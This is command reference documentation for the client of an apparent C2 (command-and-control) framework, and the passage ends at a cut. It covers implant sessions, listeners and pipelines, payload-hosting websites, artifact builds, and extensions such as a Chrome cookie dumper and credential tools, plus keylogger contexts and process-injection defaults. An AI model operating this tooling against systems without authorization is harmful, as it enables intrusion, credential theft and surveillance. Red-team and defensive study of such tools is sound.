---
title: Client
---

## generic
### !

Run a command

```
! [command]
```

### broadcast

Broadcast a message to all clients

```
broadcast [message] [flags]
```

**Options**

```
  -n, --notify   notify the message to third-party services
```

### exit

exit client

```
exit
```

### license

show server license info

**Description**

show server license info

```
license
```

**Examples**

~~~
license
~~~

### login

Login to server

```
login
```

### pivot

List all pivot agents

**Description**

List all active pivot agents with their details

```
pivot [flags]
```

**Examples**

List all pivot agents:
~~~
pivot
~~~

**Options**

```
  -a, --all   list all pivot agents
```

### status

Show runtime status overview

```
status
```

### version

show server version

```
version
```

## manage
### background

Return to the root context

**Description**

Exit the current session and return to the root context.

```
background
```

### history

Show session log history

**Description**

Displays the specified number of log lines of the current session.

```
history
```

### obverse

Manage observers

**Description**

Control observers to listen session in the background.

```
obverse [flags]
```

**Examples**

~~~
// List all observers
obverse -l

// Remove observer
obverse -r
~~~

**Options**

```
  -l, --list     list all observers
  -r, --remove   remove observer
```

### session

List and select sessions

**Description**

Display a table of active sessions on the server, 
allowing you to navigate up and down to select a desired session. 
Press the Enter key to use the selected session. 
Use the -a or --all option to display all sessions, including those that have been disconnected.
		

```
session [flags]
```

**Examples**

~~~
// List all active sessions
session

// List all sessions, including those that have been disconnected
session -a
~~~

**Options**

```
  -a, --all   show all sessions
```

**SEE ALSO**

* [session group](#session-group)	 - group session
* [session newbind](#session-newbind)	 - Create a new bind session
* [session note](#session-note)	 - add note to session
* [session remove](#session-remove)	 - remove session

#### session group

group session

**Description**

Add a session to a group. If the group does not exist, it will be created.
When using an active session, only provide the group name.

```
session group [group] [session]
```

**Examples**

~~~
// Add a session to a group
group newGroup 08d6c05a21512a79a1dfeb9d2a8f262f

// Add a session to a group when using an active session
group newGroup
~~~

**SEE ALSO**

* [session](#session)	 - List and select sessions

#### session newbind

Create a new bind session

```
session newbind [session] [flags]
```

**Options**

```
  -n, --name string       session name
      --pipeline string   pipeline id
  -t, --target string     session target
```

**SEE ALSO**

* [session](#session)	 - List and select sessions

#### session note

add note to session

**Description**

Add a note to a session. If a note already exists, it will be updated. 
When using an active session, only provide the new note.

```
session note [note] [session]
```

**Examples**

~~~
// Add a note to specified session
note newNote 08d6c05a21512a79a1dfeb9d2a8f262f

// Add a note when using an active session
note newNote
~~~

**SEE ALSO**

* [session](#session)	 - List and select sessions

#### session remove

remove session

**Description**

Remove a specified session.

```
session remove [session]
```

**Examples**

~~~
// remove a specified session
remove 08d6c05a21512a79a1dfeb9d2a8f262f
~~~

**SEE ALSO**

* [session](#session)	 - List and select sessions

### use

Use a session

**Description**

Switch to the specified session for implant-scoped commands.

```
use [session]
```

**Examples**


~~~
// use session
use 08d6c05a21512a79a1dfeb9d2a8f262f
~~~


### alias

manage aliases

**Description**


Macros are using the sideload or spawndll commands under the hood, depending on the use case. 

For Linux and Mac OS, the sideload command will be used. On Windows, it will depend on whether the macro file is a reflective DLL or not. 

Load a macro: 
~~~
load /tmp/chrome-dump 
~~~

Sliver macros have the following structure (example for the chrome-dump macro): 

chrome-dump 

* chrome-dump.dll 
* chrome-dump.so 
* manifest.json

It is a directory containing any number of files, with a mandatory manifest.json, that has the following structure: 

~~~
{ 
	"macroName":"chrome-dump", // name of the macro, can be anything
	"macroCommands":[ 
		{ 
			"name":"chrome-dump", // name of the command available in the sliver client (no space)
			"entrypoint":"ChromeDump", // entrypoint of the shared library to execute
			"help":"Dump Google Chrome cookies", // short help message
			"allowArgs":false, // make it true if the commands require arguments
			"defaultArgs": "test", // if you need to pass a default argument
			"extFiles":[ // list of files, groupped per target OS
				{ 
					"os":"windows", // Target OS for the following files. Values can be "windows", "linux" or "darwin" 
					"files":{ 
						"x64":"chrome-dump.dll", 
						"x86":"chrome-dump.x86.dll" // only x86 and x64 arch are supported, path is relative to the macro directory
					} 
				}, 
				{
					"os":"linux", 
					"files":{
						"x64":"chrome-dump.so" 
					} 
				}, 
				{
					"os":"darwin", 
					"files":{ 
						"x64":"chrome-dump.dylib"
						} 
					} 
				], 
			"isReflective":false // only set to true when using a reflective DLL
		} 
	] 
} 
~~~

Each command will have the --process flag defined, which allows you to specify the process to inject into. The following default values are set:
	
	- Windows: c:\windows\system32\svchost.exe 
	- Linux: /bin/bash 
	- Mac OS X: /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment


```
alias
```

**SEE ALSO**

* [alias install](#alias-install)	 - Install a command alias
* [alias list](#alias-list)	 - List all aliases
* [alias load](#alias-load)	 - Load a command alias
* [alias remove](#alias-remove)	 - Remove an alias

#### alias install

Install a command alias

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
alias install [alias_file]
```

**Examples**


~~~
// Install a command alias
alias install ./rubeus.exe
~~~

**SEE ALSO**

* [alias](#alias)	 - manage aliases

#### alias list

List all aliases

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
alias list
```

**SEE ALSO**

* [alias](#alias)	 - manage aliases

#### alias load

Load a command alias

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
alias load [alias]
```

**Examples**


~~~
// Load a command alias
alias load /tmp/chrome-dump
~~~

**SEE ALSO**

* [alias](#alias)	 - manage aliases

#### alias remove

Remove an alias

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
alias remove [alias]
```

**Examples**


~~~
// Remove an alias
alias remove rubeus
~~~

**SEE ALSO**

* [alias](#alias)	 - manage aliases

### extension

Extension commands

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
extension
```

**SEE ALSO**

* [extension install](#extension-install)	 - Install an extension
* [extension list](#extension-list)	 - List all extensions
* [extension load](#extension-load)	 - Load an extension
* [extension remove](#extension-remove)	 - Remove an extension

#### extension install

Install an extension

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
extension install [extension_file]
```

**Examples**


~~~
// Install an extension
extension install ./credman.tar.gz
~~~


**SEE ALSO**

* [extension](#extension)	 - Extension commands

#### extension list

List all extensions

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
extension list
```

**SEE ALSO**

* [extension](#extension)	 - Extension commands

#### extension load

Load an extension

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
extension load [extension]
```

**Examples**


~~~
// Load an extension
extension load ./credman/
~~~


**SEE ALSO**

* [extension](#extension)	 - Extension commands

#### extension remove

Remove an extension

**Description**

See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions

```
extension remove [extension]
```

**Examples**


~~~
// Remove an extension
extension remove credman
~~~


**SEE ALSO**

* [extension](#extension)	 - Extension commands

### armory

Automatically download and install extensions/aliases

**Description**

See Docs at https://sliver.sh/docs?name=Armory

```
armory [flags]
```

**Options**

```
      --bundle           install bundle
  -c, --ignore-cache     ignore metadata cache, force refresh
  -I, --insecure         skip tls certificate validation
  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)
  -t, --timeout string   download timeout
```

**SEE ALSO**

* [armory install](#armory-install)	 - Install a command armory
* [armory search](#armory-search)	 - Search for armory packages
* [armory update](#armory-update)	 - Update installed armory packages

#### armory install

Install a command armory

**Description**

See Docs at https://sliver.sh/docs?name=Armory

```
armory install [armory] [flags]
```

**Examples**


~~~
// Install a command armory
armory install rubeus 
~~~

**Options**

```
  -a, --armory string   name of the armory to install from (default "Default")
  -f, --force           force installation of package, overwriting the package if it exists
```

**Options inherited from parent commands**

```
  -c, --ignore-cache     ignore metadata cache, force refresh
  -I, --insecure         skip tls certificate validation
  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)
  -t, --timeout string   download timeout
```

**SEE ALSO**

* [armory](#armory)	 - Automatically download and install extensions/aliases

#### armory search

Search for armory packages

**Description**

See Docs at https://sliver.sh/docs?name=Armory

```
armory search [armory]
```

**Options inherited from parent commands**

```
  -c, --ignore-cache     ignore metadata cache, force refresh
  -I, --insecure         skip tls certificate validation
  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)
  -t, --timeout string   download timeout
```

**SEE ALSO**

* [armory](#armory)	 - Automatically download and install extensions/aliases

#### armory update

Update installed armory packages

**Description**

See Docs at https://sliver.sh/docs?name=Armory

```
armory update [flags]
```

**Options**

```
  -a, --armory string   name of armory to install package from (default "Default")
```

**Options inherited from parent commands**

```
  -c, --ignore-cache     ignore metadata cache, force refresh
  -I, --insecure         skip tls certificate validation
  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)
  -t, --timeout string   download timeout
```

**SEE ALSO**

* [armory](#armory)	 - Automatically download and install extensions/aliases

### mal

mal commands

```
mal
```

**SEE ALSO**

* [mal install](#mal-install)	 - Install a mal manifest
* [mal list](#mal-list)	 - List mal manifests
* [mal load](#mal-load)	 - Load a mal manifest
* [mal refresh](#mal-refresh)	 - Refresh mal manifests
* [mal remove](#mal-remove)	 - Remove a mal manifest
* [mal update](#mal-update)	 - Update a mal or all mals

#### mal install

Install a mal manifest

```
mal install [mal_file] [flags]
```

**Options**

```
      --ignore-cache     ignore cache
      --insecure         insecure
      --proxy string     proxy
      --timeout string   timeout
      --version string   mal version to install (default "latest")
```

**SEE ALSO**

* [mal](#mal)	 - mal commands

#### mal list

List mal manifests

```
mal list
```

**SEE ALSO**

* [mal](#mal)	 - mal commands

#### mal load

Load a mal manifest

```
mal load [mal]
```

**SEE ALSO**

* [mal](#mal)	 - mal commands

#### mal refresh

Refresh mal manifests

```
mal refresh
```

**SEE ALSO**

* [mal](#mal)	 - mal commands

#### mal remove

Remove a mal manifest

```
mal remove [mal]
```

**SEE ALSO**

* [mal](#mal)	 - mal commands

#### mal update

Update a mal or all mals

```
mal update [flags]
```

**Options**

```
  -a, --all              update all mal
      --ignore-cache     ignore cache
      --insecure         insecure
      --proxy string     proxy
      --timeout string   timeout
```

**SEE ALSO**

* [mal](#mal)	 - mal commands

### config

Show configuration summary

```
config
```

**SEE ALSO**

* [config ai](#config-ai)	 - Show local AI preferences
* [config github](#config-github)	 - Show Github config and more operations
* [config localrpc](#config-localrpc)	 - Show Local RPC server configuration
* [config mcp](#config-mcp)	 - Show MCP server configuration
* [config notify](#config-notify)	 - Show Notify config and more operations
* [config refresh](#config-refresh)	 - Refresh config

#### config ai

Show local AI preferences

**Description**

config ai manages local AI preferences on the client.
Agent chat/skill uses provider/model from this local config, while endpoint/api_key/proxy
are resolved on the server from server/config.yaml -> server.llm.
Legacy local ask/analyze can still use local endpoint/api_key overrides if configured.

```
config ai
```

**Examples**

~~~
// Show current AI configuration
config ai

// Enable local preferences for server-backed agent chat/skill
config ai enable --provider openai --model gpt-5.4

// Switch local provider/model preference
config ai enable --provider claude --model claude-3-5-sonnet

// Disable AI
config ai disable
~~~

**SEE ALSO**

* [config](#config)	 - Show configuration summary
* [config ai disable](#config-ai-disable)	 - Disable AI assistant
* [config ai enable](#config-ai-enable)	 - Enable local AI preferences

#### config ai disable

Disable AI assistant

```
config ai disable
```

**SEE ALSO**

* [config ai](#config-ai)	 - Show local AI preferences

#### config ai enable

Enable local AI preferences

**Description**

Enable local AI preferences for agent chat/skill.
Provider/model are stored on the client. Endpoint/api_key for the agent pipeline are read
from server/config.yaml -> server.llm. Legacy local ask/analyze can still use local overrides.

```
config ai enable [flags]
```

**Options**

```
      --api-key string     Legacy local API key for direct ask/analyze only
      --endpoint string    Legacy local API endpoint for direct ask/analyze only
      --history-size int   Number of history lines to include as context
      --max-tokens int     Maximum tokens in response
      --model string       Preferred model name for agent chat/skill
      --opsec-check        Enable AI OPSEC risk assessment for high-risk commands
      --provider string    Preferred provider for agent chat/skill: openai or claude
      --timeout int        Request timeout in seconds
```

**SEE ALSO**

* [config ai](#config-ai)	 - Show local AI preferences

#### config github

Show Github config and more operations

```
config github
```

**SEE ALSO**

* [config](#config)	 - Show configuration summary
* [config github update](#config-github-update)	 - Update Github config

#### config github update

Update Github config

```
config github update [flags]
```

**Options**

```
      --owner string          github owner
      --repo string           github repo
      --token string          github token
      --wizard                Start interactive wizard mode
      --workflowFile string   github workflow file
```

**SEE ALSO**

* [config github](#config-github)	 - Show Github config and more operations

#### config localrpc

Show Local RPC server configuration

```
config localrpc
```

**Examples**

~~~
// Show Local RPC status
config localrpc

// Enable Local RPC server
config localrpc enable

// Enable Local RPC on a custom address
config localrpc enable --addr 127.0.0.1:16004

// Disable Local RPC server
config localrpc disable
~~~

**SEE ALSO**

* [config](#config)	 - Show configuration summary
* [config localrpc disable](#config-localrpc-disable)	 - Disable Local RPC server
* [config localrpc enable](#config-localrpc-enable)	 - Enable Local RPC server

#### config localrpc disable

Disable Local RPC server

```
config localrpc disable
```

**SEE ALSO**

* [config localrpc](#config-localrpc)	 - Show Local RPC server configuration

#### config localrpc enable

Enable Local RPC server

```
config localrpc enable [flags]
```

**Options**

```
      --addr string   Local RPC server address (host:port)
```

**SEE ALSO**

* [config localrpc](#config-localrpc)	 - Show Local RPC server configuration

#### config mcp

Show MCP server configuration

```
config mcp
```

**Examples**

~~~
// Show MCP status
config mcp

// Enable MCP server
config mcp enable

// Enable MCP on a custom address
config mcp enable --addr 127.0.0.1:6006

// Disable MCP server
config mcp disable
~~~

**SEE ALSO**

* [config](#config)	 - Show configuration summary
* [config mcp disable](#config-mcp-disable)	 - Disable MCP server
* [config mcp enable](#config-mcp-enable)	 - Enable MCP server

#### config mcp disable

Disable MCP server

```
config mcp disable
```

**SEE ALSO**

* [config mcp](#config-mcp)	 - Show MCP server configuration

#### config mcp enable

Enable MCP server

```
config mcp enable [flags]
```

**Options**

```
      --addr string   MCP server address (host:port)
```

**SEE ALSO**

* [config mcp](#config-mcp)	 - Show MCP server configuration

#### config notify

Show Notify config and more operations

```
config notify
```

**SEE ALSO**

* [config](#config)	 - Show configuration summary
* [config notify update](#config-notify-update)	 - Update Notify config

#### config notify update

Update Notify config

```
config notify update [flags]
```

**Options**

```
      --dingtalk-enable           enable dingtalk
      --dingtalk-secret string    dingtalk secret
      --dingtalk-token string     dingtalk token
      --lark-enable               enable lark
      --lark-secret string        lark webhook sign secret
      --lark-webhook-url string   lark webhook url
      --pushplus-channel string   pushplus channel (default "wechat")
      --pushplus-enable           enable pushplus
      --pushplus-token string     pushplus token
      --pushplus-topic string     pushplus topic
      --serverchan-enable         enable serverchan
      --serverchan-url string     serverchan url
      --telegram-chat-id int      telegram chat id
      --telegram-enable           enable telegram
      --telegram-token string     telegram token
      --wizard                    Start interactive wizard mode
```

**SEE ALSO**

* [config notify](#config-notify)	 - Show Notify config and more operations

#### config refresh

Refresh config

```
config refresh [flags]
```

**Options**

```
      --client   Refresh client config
```

**SEE ALSO**

* [config](#config)	 - Show configuration summary

### context

Context management

**Description**

Manage different types of contexts (download, upload, credential, etc)

```
context
```

**SEE ALSO**

* [context credential](#context-credential)	 - List credential contexts
* [context delete](#context-delete)	 - Delete a context
* [context download](#context-download)	 - List download contexts
* [context keylogger](#context-keylogger)	 - List keylogger contexts
* [context media](#context-media)	 - List media contexts
* [context port](#context-port)	 - List port scan contexts
* [context screenshot](#context-screenshot)	 - List screenshot contexts
* [context upload](#context-upload)	 - List upload contexts

#### context credential

List credential contexts

```
context credential
```

**SEE ALSO**

* [context](#context)	 - Context management

#### context delete

Delete a context

**Description**

Delete a context and its associated files from the server

```
context delete [context_id] [flags]
```

**Examples**

~~~
context delete [context_id]
context delete [context_id] --yes
~~~

**Options**

```
  -y, --yes   Skip confirmation prompt
```

**SEE ALSO**

* [context](#context)	 - Context management

#### context download

List download contexts

```
context download
```

**SEE ALSO**

* [context](#context)	 - Context management

#### context keylogger

List keylogger contexts

```
context keylogger
```

**SEE ALSO**

* [context](#context)	 - Context management

#### context media

List media contexts

```
context media
```

**SEE ALSO**

* [context](#context)	 - Context management

#### context port

List port scan contexts

```
context port
```

**SEE ALSO**

* [context](#context)	 - Context management

#### context screenshot

List screenshot contexts

```
context screenshot
```

**SEE ALSO**

* [context](#context)	 - Context management

#### context upload

List upload contexts

```
context upload
```

**SEE ALSO**

* [context](#context)	 - Context management

### sync

Sync context

**Description**

sync context from server

```
sync [context_id]
```

**Examples**

~~~
sync [context_id]
~~~

### cert

Cert list

```
cert
```

**Examples**

~~~
cert
~~~

**SEE ALSO**

* [cert acme](#cert-acme)	 - obtain an ACME certificate via DNS-01 challenge
* [cert acme_config](#cert-acme_config)	 - view or update ACME configuration
* [cert delete](#cert-delete)	 - 
* [cert download](#cert-download)	 - download a cert
* [cert import](#cert-import)	 - import a new cert
* [cert self_signed](#cert-self_signed)	 - generate a self-signed cert
* [cert update](#cert-update)	 - update a cert

#### cert acme

obtain an ACME certificate via DNS-01 challenge

```
cert acme [flags]
```

**Examples**

~~~
// obtain cert using server config defaults
cert acme --domain *.example.com

// obtain cert with explicit provider
cert acme --domain example.com --provider cloudflare --cred api_token=xxx

// obtain cert using Let's Encrypt staging
cert acme --domain example.com --ca-url https://acme-staging-v02.api.letsencrypt.org/directory
~~~

**Options**

```
      --ca-url string         ACME CA directory URL
      --cred stringToString   credentials as key=value pairs (default [])
      --domain string         domain to obtain certificate for
      --email string          ACME account email
      --provider string       DNS provider: cloudflare, alidns, dnspod, route53
```

**SEE ALSO**

* [cert](#cert)	 - Cert list

#### cert acme_config

view or update ACME configuration

```
cert acme_config [flags]
```

**Examples**

~~~
// view current ACME config
cert acme_config

// set default ACME config
cert acme_config --email admin@example.com --provider cloudflare --cred api_token=xxx

// update only email
cert acme_config --email new@example.com
~~~

**Options**

```
      --ca-url string         ACME CA directory URL
      --cred stringToString   credentials as key=value pairs (default [])
      --email string          ACME account email
      --provider string       DNS provider: cloudflare, alidns, dnspod, route53
```

**SEE ALSO**

* [cert](#cert)	 - Cert list

#### cert delete



```
cert delete
```

**Examples**

~~~
// delete a cert
cert delete cert-name
~~~

**SEE ALSO**

* [cert](#cert)	 - Cert list

#### cert download

download a cert

```
cert download [flags]
```

**Examples**

~~~
// download a cert
cert download cert-name -o cert_path
~~~

**Options**

```
  -o, --output string   cert save path
```

**SEE ALSO**

* [cert](#cert)	 - Cert list

#### cert import

import a new cert

```
cert import [flags]
```

**Examples**

~~~
// generate a imported cert to server
cert import --cert cert_file_path --key key_file_path --ca-cert ca_cert_path
~~~

**Options**

```
      --ca-cert string   tls ca cert path
      --cert string      tls cert path
      --key string       tls key path
      --wizard           Start interactive wizard mode
```

**SEE ALSO**

* [cert](#cert)	 - Cert list

#### cert self_signed

generate a self-signed cert

```
cert self_signed [flags]
```

**Examples**

~~~
// generate a self-signed cert without using certificate information
cert self_signed

// generate a self-signed cert using certificate information
cert self_signed --CN commonName --O "Example Organization" --C US --L "San Francisco" --OU "IT Department" --ST California --validity 365
~~~

**Options**

```
      --C string          Certificate Country (C)
      --CN string         Certificate Common Name (CN)
      --L string          Certificate Locality/City (L)
      --O string          Certificate Organization (O)
      --OU string         Certificate Organizational Unit (OU)
      --ST string         Certificate State/Province (ST)
      --validity string   Certificate validity period in days (default "365")
      --wizard            Start interactive wizard mode
```

**SEE ALSO**

* [cert](#cert)	 - Cert list

#### cert update

update a cert

```
cert update [flags]
```

**Examples**

~~~
// update a cert
cert update cert-name --cert cert_path --key key_path --type imported
~~~

**Options**

```
      --ca-cert string   tls ca cert path
      --cert string      tls cert path
      --key string       tls key path
      --type string      cert type
      --wizard           Start interactive wizard mode
```

**SEE ALSO**

* [cert](#cert)	 - Cert list

## listener
### job

List jobs on the server

**Description**

List jobs on the server in table form.

```
job
```

**Examples**

~~~
job
~~~

### listener

List listeners on the server

**Description**

List listeners on the server in table form.

```
listener
```

**Examples**

~~~
listener
~~~

### pipeline

Manage pipelines

**Description**

Start, stop, list, and delete server pipelines.

```
pipeline
```

**SEE ALSO**

* [pipeline delete](#pipeline-delete)	 - Delete a pipeline
* [pipeline list](#pipeline-list)	 - List pipelines
* [pipeline start](#pipeline-start)	 - Start a pipeline
* [pipeline stop](#pipeline-stop)	 - Stop a pipeline

#### pipeline delete

Delete a pipeline

```
pipeline delete [pipeline]
```

**SEE ALSO**

* [pipeline](#pipeline)	 - Manage pipelines

#### pipeline list

List pipelines

**Description**

List pipelines for all listeners or for a specific listener.

```
pipeline list
```

**Examples**


list all pipelines
~~~
pipeline list
~~~

list pipelines in listener
~~~
pipeline list listener_id
~~~

**SEE ALSO**

* [pipeline](#pipeline)	 - Manage pipelines

#### pipeline start

Start a pipeline

**Description**

Start the specified pipeline.

```
pipeline start [flags]
```

**Examples**

~~~
pipeline start tcp_test
~~~

**Options**

```
      --cert-name string   certificate name
```

**SEE ALSO**

* [pipeline](#pipeline)	 - Manage pipelines

#### pipeline stop

Stop a pipeline

**Description**

Stop the specified pipeline.

```
pipeline stop
```

**Examples**

~~~
pipeline stop tcp_test
~~~

**SEE ALSO**

* [pipeline](#pipeline)	 - Manage pipelines

### website

Register a new website

**Description**

Register a new website with the specified listener. If **name** is not provided, it will be generated in the format **listenerID_web_port** .

```
website [flags]
```

**Examples**

~~~
// Register a website with the default settings
website web_test --listener tcp_default --root /webtest

// Register a website with a custom name and port
website web_test --listener tcp_default --port 5003 --root /webtest

// Register a website with TLS enabled
website web_test --listener tcp_default --root /webtest --tls --cert /path/to/cert --key /path/to/key
~~~

**Options**

```
      --auth string        HTTP Basic Auth for all paths (user:pass)
      --cert string        tls cert path
      --cert-name string   certificate name
      --host string        pipeline host, the default value is **0.0.0.0** (default "0.0.0.0")
      --ip string          external ip (default "ip")
      --key string         tls key path
  -l, --listener string    listener id
  -p, --port uint32        pipeline port, random port is selected from the range **10000-15000** 
      --root string        website root path (default "/")
  -t, --tls                enable tls
      --wizard             Start interactive wizard mode
```

**SEE ALSO**

* [website add](#website-add)	 - Add content to a website
* [website list](#website-list)	 - List websites
* [website list-content](#website-list-content)	 - List content in a website
* [website remove](#website-remove)	 - Remove content from a website
* [website start](#website-start)	 - Start a website
* [website stop](#website-stop)	 - Stop a website
* [website update](#website-update)	 - Update content in a website

#### website add

Add content to a website

**Description**

Add new content to an existing website

```
website add [file_path] [flags]
```

**Examples**

~~~
// Add content to a website with default web path (using filename)
website add /path/to/content.html --website web_test

// Add content to a website with custom web path and type
website add /path/to/content.html --website web_test --path /custom/path --type text/html
~~~

**Options**

```
      --auth string      HTTP Basic Auth for this path (user:pass), "none" to skip website default
      --path string      web path for the content (defaults to filename)
      --type string      content type of the file (default "raw")
      --website string   website name (required)
      --wizard           Start interactive wizard mode
```

**SEE ALSO**

* [website](#website)	 - Register a new website

#### website list

List websites

**Description**

List websites along with their corresponding listeners.

```
website list
```

**Examples**

~~~
website list [listener]
~~~

**SEE ALSO**

* [website](#website)	 - Register a new website

#### website list-content

List content in a website

**Description**

List all content in a website with detailed information

```
website list-content [website_name]
```

**Examples**

~~~
// List all content in a website with detailed information
website list-content web_test
~~~

**SEE ALSO**

* [website](#website)	 - Register a new website

#### website remove

Remove content from a website

**Description**

Remove content from an existing website using content ID

```
website remove [content_id]
```

**Examples**

~~~
// Remove content from a website using content ID
website remove 123e4567-e89b-12d3-a456-426614174000
~~~

**SEE ALSO**

* [website](#website)	 - Register a new website

#### website start

Start a website

**Description**

Start a website with the specified name

```
website start [name] [flags]
```

**Examples**

~~~
// Start a website
website start web_test 
~~~

**Options**

```
      --cert-name string   certificate name
```

**SEE ALSO**

* [website](#website)	 - Register a new website

#### website stop

Stop a website

**Description**

Stop a website with the specified name

```
website stop [name] [flags]
```

**Examples**

~~~
// Stop a website
website stop web_test --listener tcp_default
~~~

**Options**

```
      --listener string   listener ID
```

**SEE ALSO**

* [website](#website)	 - Register a new website

#### website update

Update content in a website

**Description**

Update existing content in a website using content ID

```
website update [content_id] [file_path] [flags]
```

**Examples**

~~~
// Update content in a website with content ID
website update 123e4567-e89b-12d3-a456-426614174000 /path/to/new_content.html --website web_test
~~~

**Options**

```
      --type string      content type of the file (default "raw")
      --website string   website name (required)
      --wizard           Start interactive wizard mode
```

**SEE ALSO**

* [website](#website)	 - Register a new website

### bind

Register a new bind pipeline and start it

```
bind [flags]
```

**Examples**


new bind pipeline
~~~
bind --listener listener
~~~


**Options**

```
      --listener string   listener id
      --wizard            Start interactive wizard mode
```

### http

Register a new HTTP pipeline and start it

**Description**

Register a new HTTP pipeline with the specified listener.

```
http [flags]
```

**Examples**

~~~
// Register an HTTP pipeline with the default settings
http --listener listener

// Register an HTTP pipeline with custom headers and error page
http http_test --listener listener --host 192.168.0.43 --port 8080 --headers "Content-Type=text/html" --error-page /path/to/error.html

// Register an HTTP pipeline with TLS enabled
http --listener listener --tls --cert /path/to/cert --key /path/to/key
~~~

**Options**

```
      --cert string              tls cert path
      --cert-name string         certificate name
      --encryption-key string    encryption key
      --encryption-type string   encryption type
      --error-page string        Path to custom error page file
      --headers stringToString   HTTP response headers (key=value) (default [])
      --host string              pipeline host, the default value is **0.0.0.0** (default "0.0.0.0")
      --ip string                external ip (default "ip")
      --key string               tls key path
  -l, --listener string          listener id
      --parser string            pipeline parser (default "default")
  -p, --port uint32              pipeline port, random port is selected from the range **10000-15000** 
      --secure                   enable secure mode
  -t, --tls                      enable tls
      --wizard                   Start interactive wizard mode
```

### rem

Manage REM pipelines

**Description**

List, create, start, stop, and delete REM pipelines.

```
rem
```

**Examples**

~~~
rem
~~~

**SEE ALSO**

* [rem delete](#rem-delete)	 - Delete a REM
* [rem list](#rem-list)	 - List REMs in listener
* [rem new](#rem-new)	 - Register a new REM and start it
* [rem start](#rem-start)	 - Start a REM
* [rem stop](#rem-stop)	 - Stop a REM
* [rem update](#rem-update)	 - Update REM agent configuration

#### rem delete

Delete a REM

```
rem delete
```

**Examples**

~~~
rem delete rem_test
~~~

**SEE ALSO**

* [rem](#rem)	 - Manage REM pipelines

#### rem list

List REMs in listener

**Description**

Use a table to list REMs along with their corresponding listeners

```
rem list [listener]
```

**Examples**

~~~
rem list [listener]
~~~

**SEE ALSO**

* [rem](#rem)	 - Manage REM pipelines

#### rem new

Register a new REM and start it

**Description**

Register a new REM with the specified listener.

```
rem new [name] [flags]
```

**Examples**

~~~
// Register a REM with the default settings
rem new --listener listener_id

// Register a REM with a custom name and console URL
rem new rem_test --listener listener_id -c tcp://127.0.0.1:19966
~~~

**Options**

```
  -c, --console string    REM console URL (default "tcp://0.0.0.0")
  -l, --listener string   listener id
      --wizard            Start interactive wizard mode
```

**SEE ALSO**

* [rem](#rem)	 - Manage REM pipelines

#### rem start

Start a REM

**Description**

Start a REM with the specified name

```
rem start
```

**Examples**

~~~
rem start rem_test
~~~

**SEE ALSO**

* [rem](#rem)	 - Manage REM pipelines

#### rem stop

Stop a REM

**Description**

Stop a REM with the specified name

```
rem stop
```

**Examples**

~~~
rem stop rem_test
~~~

**SEE ALSO**

* [rem](#rem)	 - Manage REM pipelines

#### rem update

Update REM agent configuration

**SEE ALSO**

* [rem](#rem)	 - Manage REM pipelines
* [rem update interval](#rem-update-interval)	 - Dynamically change REM agent polling interval

#### rem update interval

Dynamically change REM agent polling interval

```
rem update interval [interval_ms] [flags]
```

**Examples**

~~~
rem update interval --session-id 08d6c05a 5000
rem update interval --agent-id uDM0BgG6 5000
rem update interval --pipeline-id rem_graph_api_03 --agent-id uDM0BgG6 5000
~~~

**Options**

```
      --agent-id string      REM agent ID (pipeline is auto-resolved if unique)
      --pipeline-id string   Pipeline name (required only when agent exists on multiple pipelines)
      --session-id string    Session ID to reconfigure (resolves pipeline and agent automatically)
```

**SEE ALSO**

* [rem update](#rem-update)	 - Update REM agent configuration

### tcp

Register a new TCP pipeline and start it

**Description**

Register a new TCP pipeline with the specified listener.

```
tcp [flags]
```

**Examples**

~~~
// Register a TCP pipeline with the default settings
tcp --listener listener

// Register a TCP pipeline with a custom name, host, and port
tcp tcp_test --listener listener --host 192.168.0.43 --port 5003

// Register a TCP pipeline with TLS enabled and specify certificate and key paths
tcp --listener listener --tls --cert /path/to/cert --key /path/to/key
~~~

**Options**

```
      --cert string              tls cert path
      --cert-name string         certificate name
      --encryption-key string    encryption key
      --encryption-type string   encryption type
      --host string              pipeline host, the default value is **0.0.0.0** (default "0.0.0.0")
      --ip string                external ip (default "ip")
      --key string               tls key path
  -l, --listener string          listener id
      --parser string            pipeline parser (default "default")
  -p, --port uint32              pipeline port, random port is selected from the range **10000-15000** 
      --secure                   enable secure mode
  -t, --tls                      enable tls
      --wizard                   Start interactive wizard mode
```

## generator
### artifact

Manage build artifacts

**Description**

Manage build output files on the server. Use the **list** command to view all available artifacts, **download** to retrieve a specific artifact, and **upload** to add a new artifact to the server.

**SEE ALSO**

* [artifact delete](#artifact-delete)	 - Delete an artifact from the server
* [artifact download](#artifact-download)	 - Download a build output file from the server
* [artifact list](#artifact-list)	 - List build artifacts on the server
* [artifact show](#artifact-show)	 - Show artifact metadata and profile
* [artifact upload](#artifact-upload)	 - Upload a build output file to the server

#### artifact delete

Delete an artifact from the server

**Description**

Delete a specify artifact in the server.



```
artifact delete  
```

**Examples**


~~~
artifact delete artifact_name
~~~


**SEE ALSO**

* [artifact](#artifact)	 - Manage build artifacts

#### artifact download

Download a build output file from the server

**Description**

Download a specific build output file from the server by specifying its unique artifact name.


```
artifact download [flags]
```

**Examples**


// Download a artifact
	artifact download artifact_name

// Download a artifact to specific path
	artifact download artifact_name -o /path/to/output

// Download an artifact in a specific format (e.g.raw, bin, golang source, C source, etc.)
  	artifact download artifact_name --format raw


**Options**

```
      --RDI string      RDI type
  -f, --format string   the format of the artifact (default "executable")
  -o, --output string   output path
```

**SEE ALSO**

* [artifact](#artifact)	 - Manage build artifacts

#### artifact list

List build artifacts on the server

**Description**

Retrieve a list of all build output files currently stored on the server.

This command fetches metadata about artifacts, such as their names, IDs, and associated build configurations. In an interactive terminal you can select a completed artifact to download; in non-interactive mode the command prints the table and exits.

```
artifact list
```

**Examples**

~~~
// List all available build artifacts on the server
artifact list

// Download a specific artifact non-interactively
